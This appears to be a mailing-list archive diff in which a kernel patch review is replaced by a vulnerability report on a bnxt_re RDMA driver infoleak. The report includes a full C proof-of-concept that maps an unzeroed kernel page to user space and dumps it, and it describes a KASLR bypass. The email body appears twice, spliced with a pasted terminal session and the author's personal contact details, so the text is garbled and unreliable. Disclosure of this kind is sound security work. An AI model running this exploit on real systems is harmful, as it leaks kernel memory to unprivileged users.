-	FROM_NEQ_ENVFROM(0.00)[dtatulea@nvidia.com,linux-rdma@vger.kernel.org];
-	DKIM_TRACE(0.00)[Nvidia.com:+];
+	FROM_NEQ_ENVFROM(0.00)[pomzm67@gmail.com,linux-rdma@vger.kernel.org];
+	RCPT_COUNT_THREE(0.00)[4];
 	NEURAL_HAM(-0.00)[-1.000];
-	TAGGED_RCPT(0.00)[linux-rdma,netdev];
-	MID_RHS_MATCH_FROM(0.00)[];
-	ASN(0.00)[asn:63949, ipnet:172.234.224.0/19, country:SG];
-	TO_DN_SOME(0.00)[]
+	TAGGED_RCPT(0.00)[linux-rdma];
+	MID_RHS_MATCH_FROMTLD(0.00)[];
+	FREEMAIL_FROM(0.00)[gmail.com];
+	DBL_BLOCKED_OPENRESOLVER(0.00)[broadcom.com:email,defensify.se:email,defensify.se:url,keybase.io:url,sea.lore.kernel.org:helo,sea.lore.kernel.org:rdns,mail.gmail.com:mid]
 X-Rspamd-Action: no action
 
+Hi,
 
+I am reporting an information disclosure in the bnxt_re RDMA driver.
+The shared page handed to userspace via BNXT_RE_MMAP_SH_PAGE is
+allocated with __get_free_page(GFP_KERNEL) and never zeroed, leaking
+up to 4092 bytes of stale kernel data per per-process ucontext.
 
-On 08.05.26 14:43, David Laight wrote:
-> On Thu, 7 May 2026 12:53:29 +0300
-> Tariq Toukan <tariqt@nvidia.com> wrote:
-> 
->> From: Christoph Paasch <cpaasch@openai.com>
->>
->> mlx5e_skb_from_cqe_mpwrq_nonlinear() copies MLX5E_RX_MAX_HEAD (256)
->> bytes from the page-pool to the skb's linear part. Those 256 bytes
->> include part of the payload.
->>
->> When attempting to do GRO in skb_gro_receive, if headlen > data_offset
->> (and skb->head_frag is not set), we end up aggregating packets in the
->> frag_list.
->>
->> This is of course not good when we are CPU-limited. Also causes a worse
->> skb->len/truesize ratio,...
->>
->> So, let's avoid copying parts of the payload to the linear part. We use
->> eth_get_headlen() to parse the headers and compute the length of the
->> protocol headers, which will be used to copy the relevant bits of the
->> skb's linear part.
->>
->> We still allocate MLX5E_RX_MAX_HEAD for the skb so that if the networking
->> stack needs to call pskb_may_pull() later on, we don't need to reallocate
->> memory.
->>
->> This gives a nice throughput increase (ARM Neoverse-V2 with CX-7 NIC and
->> LRO enabled):
->>
->> BEFORE:
->> =======
->> (netserver pinned to core receiving interrupts)
->> $ netperf -H 10.221.81.118 -T 80,9 -P 0 -l 60 -- -m 256K -M 256K
->>  87380  16384 262144    60.01    32547.82
->>
->> (netserver pinned to adjacent core receiving interrupts)
->> $ netperf -H 10.221.81.118 -T 80,10 -P 0 -l 60 -- -m 256K -M 256K
->>  87380  16384 262144    60.00    52531.67
->>
->> AFTER:
->> ======
->> (netserver pinned to core receiving interrupts)
->> $ netperf -H 10.221.81.118 -T 80,9 -P 0 -l 60 -- -m 256K -M 256K
->>  87380  16384 262144    60.00    52896.06
->>
->> (netserver pinned to adjacent core receiving interrupts)
->>  $ netperf -H 10.221.81.118 -T 80,10 -P 0 -l 60 -- -m 256K -M 256K
->>  87380  16384 262144    60.00    85094.90
->>
->> Additional tests across a larger range of parameters w/ and w/o LRO, w/
->> and w/o IPv6-encapsulation, different MTUs (1500, 4096, 9000), different
->> TCP read/write-sizes as well as UDP benchmarks, all have shown equal or
->> better performance with this patch.
->>
->> Reviewed-by: Eric Dumazet <edumazet@google.com>
->> Reviewed-by: Saeed Mahameed <saeedm@nvidia.com>
->> Signed-off-by: Christoph Paasch <cpaasch@openai.com>
->> Signed-off-by: Dragos Tatulea <dtatulea@nvidia.com>
->> Signed-off-by: Tariq Toukan <tariqt@nvidia.com>
->> ---
->>  drivers/net/ethernet/mellanox/mlx5/core/en_rx.c | 9 +++++++--
->>  1 file changed, 7 insertions(+), 2 deletions(-)
->>
->> diff --git a/drivers/net/ethernet/mellanox/mlx5/core/en_rx.c b/drivers/net/ethernet/mellanox/mlx5/core/en_rx.c
->> index 75ccf40a7f17..301b33419207 100644
->> --- a/drivers/net/ethernet/mellanox/mlx5/core/en_rx.c
->> +++ b/drivers/net/ethernet/mellanox/mlx5/core/en_rx.c
-> ...
->> @@ -2060,8 +2066,7 @@ mlx5e_skb_from_cqe_mpwrq_nonlinear(struct mlx5e_rq *rq, struct mlx5e_mpw_info *w
->>  				pagep->frags++;
->>  			while (++pagep < frag_page);
->>  
->> -			headlen = min_t(u16, MLX5E_RX_MAX_HEAD - len,
->> -					skb->data_len);
->> +			headlen = min_t(u16, headlen - len, skb->data_len);
-> 
-> That looks entirely broken.
-> skb->data_len can be larger than 65535 so (u16)skb->data_len can
-> discard significant bits.
-> 
-> I can't quite see why the subtract can't overflow either.
-> It is entirely non-obvious.
->
-A check will be added for that.
- 
-> There seem to be far too many u16 local variables in this code.
-> Typically they just make the code larger because they require the
-> compiler mask arithmetic results to 16bits all the time.
-> (Only x86 and m68k have instructions for 8 and 16bit arithmetic.)
-> The same is true for function parameters and results.
-> 
-> I think all the min_t() in this file can easily be changed to min().
->
-Will use min() here. And for the rest of the datapath files I will look
-into a follow-up patch.
+Affected kernel versions
+------------------------
+Confirmed present in:
+  - 6.6.81 LTS    drivers/infiniband/hw/bnxt_re/ib_verbs.c:4158
+  - 6.12.42 LTS   drivers/infiniband/hw/bnxt_re/ib_verbs.c:4241
+  - 7.0.5 stable  drivers/infiniband/hw/bnxt_re/ib_verbs.c:4378
+  - mainline as of 2026-05-08 (per torvalds/master tip)
 
-Thanks,
-Dragos
+No memset(uctx->shpg, 0, PAGE_SIZE) exists in any of these trees.
+
+Problem description
+-------------------
+bnxt_re_alloc_ucontext() in drivers/infiniband/hw/bnxt_re/ib_verbs.c
+allocates the per-context shared page:
+
+    uctx->shpg =3D (void *)__get_free_page(GFP_KERNEL);
+
+The page is then registered for mmap exposure via:
+
+    entry =3D bnxt_re_mmap_entry_insert(uctx, 0, BNXT_RE_MMAP_SH_PAGE, NULL=
+);
+
+And mapped into userspace by bnxt_re_mmap():
+
+    case BNXT_RE_MMAP_SH_PAGE:
+        ret =3D vm_insert_page(vma, vma->vm_start, virt_to_page(uctx->shpg)=
+);
+        break;
+
+The only kernel write into this page is a single u32 store of the AVID
+at offset BNXT_RE_AVID_OFFT (0x10) inside bnxt_re_create_ah():
+
+    wrptr =3D (u32 *)(uctx->shpg + BNXT_RE_AVID_OFFT);
+    *wrptr =3D ah->qplib_ah.id;
+
+Since __get_free_page(GFP_KERNEL) returns a buddy page that is not
+zeroed, the remaining 4092 bytes of the page contain stale kernel data
+when the userspace process maps it. Any user with access to the
+relevant /dev/infiniband/uverbsX node and a bnxt_re device can read
+this data via a single mmap() call after IB_USER_VERBS_CMD_GET_CONTEXT.
+
+The leaked content depends on the freed kernel object that previously
+occupied the page. In practice it can include kernel pointers
+(KASLR bypass), slab objects, fragments of recently freed user-process
+pages, network skbs, and DMA ring data.
+
+Why this is unintentional, not by design
+----------------------------------------
+1. The same file already uses get_zeroed_page() for the analogous
+   per-SRQ and per-CQ user-mapped shared pages:
+
+       drivers/infiniband/hw/bnxt_re/ib_verbs.c:1956
+           srq->uctx_srq_page =3D (void *)get_zeroed_page(GFP_KERNEL);
+       drivers/infiniband/hw/bnxt_re/ib_verbs.c:3229
+           cq->uctx_cq_page  =3D (void *)get_zeroed_page(GFP_KERNEL);
+
+   shpg is the only outlier.
+
+2. Other RDMA drivers consistently zero pages they expose:
+
+       drivers/infiniband/hw/qedr/verbs.c:758    get_zeroed_page(GFP_USER)
+       drivers/infiniband/hw/mlx4/mr.c:306       get_zeroed_page(GFP_KERNEL=
+)
+       drivers/infiniband/hw/mthca/mthca_allocator.c:129
+                                                 get_zeroed_page(GFP_ATOMIC=
+)
+       drivers/infiniband/hw/efa/efa_verbs.c:190 alloc_pages_exact(...
+__GFP_ZERO)
+       drivers/infiniband/hw/mlx5/umr.c:509      gfp_mask |=3D __GFP_ZERO
+
+3. The driver only ever writes 4 bytes of the 4096-byte page; the
+   remaining bytes have no driver-defined contents and should be zero
+   if the convention is respected.
+
+Reproducer
+----------
+A standalone C reproducer (no libibverbs dependency, only kernel uapi
+inline-copied) is included below. It opens /dev/infiniband/uverbsX,
+creates a ucontext with IB_USER_VERBS_CMD_GET_CONTEXT, mmap()'s pgoff=3D0
+(BNXT_RE_MMAP_SH_PAGE), and dumps the resulting page.
+
+Build:
+    gcc -O2 -Wall -Wextra -o 041_poc 041_bnxt_re_shpg_leak.c
+
+Run on a host with bnxt_re hardware:
+    ./041_poc
+
+Source (paste into 041_bnxt_re_shpg_leak.c):
+
+----- 8< ----- 8< ----- 8< -----
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <dirent.h>
+
+enum { IB_USER_VERBS_CMD_GET_CONTEXT =3D 1 };
+
+struct ib_uverbs_cmd_hdr {
+    uint32_t command;
+    uint16_t in_words;
+    uint16_t out_words;
+};
+
+struct ib_uverbs_get_context {
+    uint64_t response;
+    uint64_t driver_data[0];
+};
+
+#define BNXT_RE_RESP_BYTES   1024
+#define PAGE_SIZE_LOCAL      4096
+
+static int find_uverbs(char *out, size_t out_len)
+{
+    DIR *d =3D opendir("/dev/infiniband");
+    if (!d) { perror("opendir"); return -1; }
+    struct dirent *de;
+    while ((de =3D readdir(d))) {
+        if (strncmp(de->d_name, "uverbs", 6) =3D=3D 0) {
+            snprintf(out, out_len, "/dev/infiniband/%s", de->d_name);
+            closedir(d);
+            return 0;
+        }
+    }
+    closedir(d);
+    return -1;
+}
+
+static int alloc_ucontext(int fd)
+{
+    struct {
+        struct ib_uverbs_cmd_hdr hdr;
+        struct ib_uverbs_get_context cmd;
+        uint64_t bnxt_re_req[1];
+    } req;
+    static uint8_t resp_buf[BNXT_RE_RESP_BYTES] __attribute__((aligned(8)))=
+;
+
+    memset(&req, 0, sizeof(req));
+    memset(resp_buf, 0, sizeof(resp_buf));
+
+    req.hdr.command   =3D IB_USER_VERBS_CMD_GET_CONTEXT;
+    req.hdr.in_words  =3D (sizeof(req) - sizeof(req.hdr)) / 4;
+    req.hdr.out_words =3D BNXT_RE_RESP_BYTES / 4;
+    req.cmd.response  =3D (uintptr_t)resp_buf;
+
+    if (write(fd, &req, sizeof(req)) < 0) {
+        perror("write get_context");
+        return -1;
+    }
+    return 0;
+}
+
+int main(void)
+{
+    char path[256];
+    if (find_uverbs(path, sizeof(path)) < 0) return 1;
+
+    int fd =3D open(path, O_RDWR);
+    if (fd < 0) { perror("open"); return 1; }
+    if (alloc_ucontext(fd) < 0) { close(fd); return 1; }
+
+    void *p =3D mmap(NULL, PAGE_SIZE_LOCAL, PROT_READ, MAP_SHARED, fd, 0);
+    if (p =3D=3D MAP_FAILED) { perror("mmap"); close(fd); return 1; }
+
+    const uint8_t *b =3D p;
+    int nonzero =3D 0;
+    for (int i =3D 0; i < PAGE_SIZE_LOCAL; i++) {
+        if (i >=3D 0x10 && i <=3D 0x13) continue;
+        if (b[i]) nonzero++;
+    }
+    printf("non-zero bytes outside AVID field: %d / %d\n",
+           nonzero, PAGE_SIZE_LOCAL - 4);
+
+    for (int i =3D 0; i < PAGE_SIZE_LOCAL; i +=3D 16) {
+        printf("%04x  ", i);
+        for (int j =3D 0; j < 16; j++) printf("%02x ", b[i+j]);
+        printf("\n");
+    }
+
+    munmap(p, PAGE_SIZE_LOCAL);
+    close(fd);
+    return 0;
+}
+----- >8 ----- >8 ----- >8 -----
+
+Conditions
+----------
+- Hardware: Broadcom NetXtreme-E NIC with bnxt_re module loaded
+  (BCM5750x family).
+- Permissions: read/write access to /dev/infiniband/uverbsX. On most
+  distributions this requires membership in the rdma group, but some
+  configurations expose the node more broadly via udev rules.
+- No CAP_SYS_ADMIN, CAP_NET_ADMIN, or CAP_NET_RAW required.
+
+Suggested fix (one-line)
+------------------------
+diff --git a/drivers/infiniband/hw/bnxt_re/ib_verbs.c
+b/drivers/infiniband/hw/bnxt_re/ib_verbs.c
+--- a/drivers/infiniband/hw/bnxt_re/ib_verbs.c
++++ b/drivers/infiniband/hw/bnxt_re/ib_verbs.c
+@@ -4375,7 +4375,7 @@ int bnxt_re_alloc_ucontext(struct ib_ucontext
+*ctx, struct ib_udata *udata)
+
+        uctx->rdev =3D rdev;
+
+-       uctx->shpg =3D (void *)__get_free_page(GFP_KERNEL);
++       uctx->shpg =3D (void *)get_zeroed_page(GFP_KERNEL);
+        if (!uctx->shpg) {
+                rc =3D -ENOMEM;
+                goto fail;
+
+Performance impact: one page-zeroing per ucontext allocation, i.e. once
+per RDMA application connection. Negligible.
+
+Disclosure
+----------
+I have not shared this report outside this email. I am willing to
+follow the standard Linux kernel security disclosure timeline (up to
+14 days). Please let me know once you have confirmed the issue, and
+whether you want me to handle the CVE request via cve@kernel.org or
+whether the security team will route it.
+
+Best regards,
+<your name>
+15:29 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/disclosure
+=E2=9D=AF cd ..
+15:30 l0rds474n@ghostnode:~/Dokument/CVE-Hunt
+=E2=9D=AF ls
+disclosure  findings  poc  sources
+15:30 l0rds474n@ghostnode:~/Dokument/CVE-Hunt
+=E2=9D=AF cd poc/
+15:30 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/poc
+=E2=9D=AF ls
+041_bnxt_re_shpg_leak.c  041_poc
+15:30 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/poc
+=E2=9D=AF ./041_poc
+[!] /dev/infiniband saknas =E2=80=94 RDMA-stack ej laddad?
+=E2=9C=981 15:30 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/poc
+=E2=9D=AF id
+uid=3D1000(l0rds474n) gid=3D1001(l0rds474n)
+grupper=3D1001(l0rds474n),20(dialout),24(cdrom),25(floppy),27(sudo),29(audi=
+o),30(dip),44(video),46(plugdev),106(netdev),120(bluetooth),126(lpadmin),12=
+9(scanner),1000(docker)
+15:31 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/poc
+=E2=9D=AF cd ..
+15:40 l0rds474n@ghostnode:~/Dokument/CVE-Hunt
+=E2=9D=AF cd disclosure/
+15:40 l0rds474n@ghostnode:~/Dokument/CVE-Hunt/disclosure
+=E2=9D=AF cat email-template.txt
+To: security@kernel.org
+Cc: selvin.xavier@broadcom.com, kalesh-anakkur.purayil@broadcom.com,
+linux-rdma@vger.kernel.org
+Subject: [security] RDMA/bnxt_re: kernel infoleak via uninitialised
+shpg shared page exposed to userspace
+
+Hi,
+
+I am a Senior IT Security Researcher at Defensify (https://defensify.se),
+reporting an information disclosure vulnerability in the bnxt_re RDMA
+driver. The shared page handed to userspace via BNXT_RE_MMAP_SH_PAGE is
+allocated with __get_free_page(GFP_KERNEL) and never zeroed, leaking
+up to 4092 bytes of stale kernel data per per-process ucontext.
+
+Affected kernel versions
+------------------------
+Confirmed present in:
+  - 6.6.81 LTS    drivers/infiniband/hw/bnxt_re/ib_verbs.c:4158
+  - 6.12.42 LTS   drivers/infiniband/hw/bnxt_re/ib_verbs.c:4241
+  - 7.0.5 stable  drivers/infiniband/hw/bnxt_re/ib_verbs.c:4378
+  - mainline as of 2026-05-08 (per torvalds/master tip)
+
+No memset(uctx->shpg, 0, PAGE_SIZE) exists in any of these trees.
+
+Problem description
+-------------------
+bnxt_re_alloc_ucontext() in drivers/infiniband/hw/bnxt_re/ib_verbs.c
+allocates the per-context shared page:
+
+    uctx->shpg =3D (void *)__get_free_page(GFP_KERNEL);
+
+The page is then registered for mmap exposure via:
+
+    entry =3D bnxt_re_mmap_entry_insert(uctx, 0, BNXT_RE_MMAP_SH_PAGE, NULL=
+);
+
+And mapped into userspace by bnxt_re_mmap():
+
+    case BNXT_RE_MMAP_SH_PAGE:
+        ret =3D vm_insert_page(vma, vma->vm_start, virt_to_page(uctx->shpg)=
+);
+        break;
+
+The only kernel write into this page is a single u32 store of the AVID
+at offset BNXT_RE_AVID_OFFT (0x10) inside bnxt_re_create_ah():
+
+    wrptr =3D (u32 *)(uctx->shpg + BNXT_RE_AVID_OFFT);
+    *wrptr =3D ah->qplib_ah.id;
+
+Since __get_free_page(GFP_KERNEL) returns a buddy page that is not
+zeroed, the remaining 4092 bytes of the page contain stale kernel data
+when the userspace process maps it. Any user with access to the
+relevant /dev/infiniband/uverbsX node and a bnxt_re device can read
+this data via a single mmap() call after IB_USER_VERBS_CMD_GET_CONTEXT.
+
+The leaked content depends on the freed kernel object that previously
+occupied the page. In practice it can include kernel pointers
+(KASLR bypass), slab objects, fragments of recently freed user-process
+pages, network skbs, and DMA ring data.
+
+Why this is unintentional, not by design
+----------------------------------------
+1. The same file already uses get_zeroed_page() for the analogous
+   per-SRQ and per-CQ user-mapped shared pages:
+
+       drivers/infiniband/hw/bnxt_re/ib_verbs.c:1956
+           srq->uctx_srq_page =3D (void *)get_zeroed_page(GFP_KERNEL);
+       drivers/infiniband/hw/bnxt_re/ib_verbs.c:3229
+           cq->uctx_cq_page  =3D (void *)get_zeroed_page(GFP_KERNEL);
+
+   shpg is the only outlier.
+
+2. Other RDMA drivers consistently zero pages they expose:
+
+       drivers/infiniband/hw/qedr/verbs.c:758    get_zeroed_page(GFP_USER)
+       drivers/infiniband/hw/mlx4/mr.c:306       get_zeroed_page(GFP_KERNEL=
+)
+       drivers/infiniband/hw/mthca/mthca_allocator.c:129
+                                                 get_zeroed_page(GFP_ATOMIC=
+)
+       drivers/infiniband/hw/efa/efa_verbs.c:190 alloc_pages_exact(...
+__GFP_ZERO)
+       drivers/infiniband/hw/mlx5/umr.c:509      gfp_mask |=3D __GFP_ZERO
+
+3. The driver only ever writes 4 bytes of the 4096-byte page; the
+   remaining bytes have no driver-defined contents and should be zero
+   if the convention is respected.
+
+Reproducer
+----------
+A standalone C reproducer (no libibverbs dependency, only kernel uapi
+inline-copied) is included below. It opens /dev/infiniband/uverbsX,
+creates a ucontext with IB_USER_VERBS_CMD_GET_CONTEXT, mmap()'s pgoff=3D0
+(BNXT_RE_MMAP_SH_PAGE), and dumps the resulting page.
+
+Build:
+    gcc -O2 -Wall -Wextra -o 041_poc 041_bnxt_re_shpg_leak.c
+
+Run on a host with bnxt_re hardware:
+    ./041_poc
+
+Source (paste into 041_bnxt_re_shpg_leak.c):
+
+----- 8< ----- 8< ----- 8< -----
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <dirent.h>
+
+enum { IB_USER_VERBS_CMD_GET_CONTEXT =3D 1 };
+
+struct ib_uverbs_cmd_hdr {
+    uint32_t command;
+    uint16_t in_words;
+    uint16_t out_words;
+};
+
+struct ib_uverbs_get_context {
+    uint64_t response;
+    uint64_t driver_data[0];
+};
+
+#define BNXT_RE_RESP_BYTES   1024
+#define PAGE_SIZE_LOCAL      4096
+
+static int find_uverbs(char *out, size_t out_len)
+{
+    DIR *d =3D opendir("/dev/infiniband");
+    if (!d) { perror("opendir"); return -1; }
+    struct dirent *de;
+    while ((de =3D readdir(d))) {
+        if (strncmp(de->d_name, "uverbs", 6) =3D=3D 0) {
+            snprintf(out, out_len, "/dev/infiniband/%s", de->d_name);
+            closedir(d);
+            return 0;
+        }
+    }
+    closedir(d);
+    return -1;
+}
+
+static int alloc_ucontext(int fd)
+{
+    struct {
+        struct ib_uverbs_cmd_hdr hdr;
+        struct ib_uverbs_get_context cmd;
+        uint64_t bnxt_re_req[1];
+    } req;
+    static uint8_t resp_buf[BNXT_RE_RESP_BYTES] __attribute__((aligned(8)))=
+;
+
+    memset(&req, 0, sizeof(req));
+    memset(resp_buf, 0, sizeof(resp_buf));
+
+    req.hdr.command   =3D IB_USER_VERBS_CMD_GET_CONTEXT;
+    req.hdr.in_words  =3D (sizeof(req) - sizeof(req.hdr)) / 4;
+    req.hdr.out_words =3D BNXT_RE_RESP_BYTES / 4;
+    req.cmd.response  =3D (uintptr_t)resp_buf;
+
+    if (write(fd, &req, sizeof(req)) < 0) {
+        perror("write get_context");
+        return -1;
+    }
+    return 0;
+}
+
+int main(void)
+{
+    char path[256];
+    if (find_uverbs(path, sizeof(path)) < 0) return 1;
+
+    int fd =3D open(path, O_RDWR);
+    if (fd < 0) { perror("open"); return 1; }
+    if (alloc_ucontext(fd) < 0) { close(fd); return 1; }
+
+    void *p =3D mmap(NULL, PAGE_SIZE_LOCAL, PROT_READ, MAP_SHARED, fd, 0);
+    if (p =3D=3D MAP_FAILED) { perror("mmap"); close(fd); return 1; }
+
+    const uint8_t *b =3D p;
+    int nonzero =3D 0;
+    for (int i =3D 0; i < PAGE_SIZE_LOCAL; i++) {
+        if (i >=3D 0x10 && i <=3D 0x13) continue;
+        if (b[i]) nonzero++;
+    }
+    printf("non-zero bytes outside AVID field: %d / %d\n",
+           nonzero, PAGE_SIZE_LOCAL - 4);
+
+    for (int i =3D 0; i < PAGE_SIZE_LOCAL; i +=3D 16) {
+        printf("%04x  ", i);
+        for (int j =3D 0; j < 16; j++) printf("%02x ", b[i+j]);
+        printf("\n");
+    }
+
+    munmap(p, PAGE_SIZE_LOCAL);
+    close(fd);
+    return 0;
+}
+----- >8 ----- >8 ----- >8 -----
+
+Conditions
+----------
+- Hardware: Broadcom NetXtreme-E NIC with bnxt_re module loaded
+  (BCM5750x family).
+- Permissions: read/write access to /dev/infiniband/uverbsX. On most
+  distributions this requires membership in the rdma group, but some
+  configurations expose the node more broadly via udev rules.
+- No CAP_SYS_ADMIN, CAP_NET_ADMIN, or CAP_NET_RAW required.
+
+Suggested fix (one-line)
+------------------------
+diff --git a/drivers/infiniband/hw/bnxt_re/ib_verbs.c
+b/drivers/infiniband/hw/bnxt_re/ib_verbs.c
+--- a/drivers/infiniband/hw/bnxt_re/ib_verbs.c
++++ b/drivers/infiniband/hw/bnxt_re/ib_verbs.c
+@@ -4375,7 +4375,7 @@ int bnxt_re_alloc_ucontext(struct ib_ucontext
+*ctx, struct ib_udata *udata)
+
+        uctx->rdev =3D rdev;
+
+-       uctx->shpg =3D (void *)__get_free_page(GFP_KERNEL);
++       uctx->shpg =3D (void *)get_zeroed_page(GFP_KERNEL);
+        if (!uctx->shpg) {
+                rc =3D -ENOMEM;
+                goto fail;
+
+Performance impact: one page-zeroing per ucontext allocation, i.e. once
+per RDMA application connection. Negligible.
+
+Disclosure and credit
+---------------------
+This issue was discovered during independent vulnerability research at
+Defensify (https://defensify.se), a Swedish IT security firm focused on
+offensive and defensive kernel-level research.
+
+I have not shared this report outside this email. I am willing to
+follow the standard Linux kernel security disclosure timeline (up to
+14 days). Please let me know once you have confirmed the issue, and
+whether you want me to handle the CVE request via cve@kernel.org or
+whether the security team will route it.
+
+For the CVE record, mailing-list announcements, fix commit message
+("Reported-by:") and any kernel.org acknowledgements, please attribute
+the discovery as follows:
+
+    Reported-by: Lord Ulf Henrik Holmberg
+<henrik.holmberg@defensify.se> (Defensify)
+
+If your tooling does not accept the parenthetical affiliation, the bare
+form
+
+    Reported-by: Lord Ulf Henrik Holmberg <henrik.holmberg@defensify.se>
+
+is acceptable; the @defensify.se address itself attributes the work to
+the company. Please CC me on the resulting commit and any CVE record so
+we can mirror it on our advisory page.
+
+Best regards,
+
+Lord Ulf Henrik Holmberg
+Senior IT Security Researcher
+Defensify
+https://defensify.se
+henrik.holmberg@defensify.se
+GitHub: https://github.com/L0rdS474n
++46 73 599 52 38
+PGP: https://keybase.io/d313373_m3/pgp_keys.asc
 
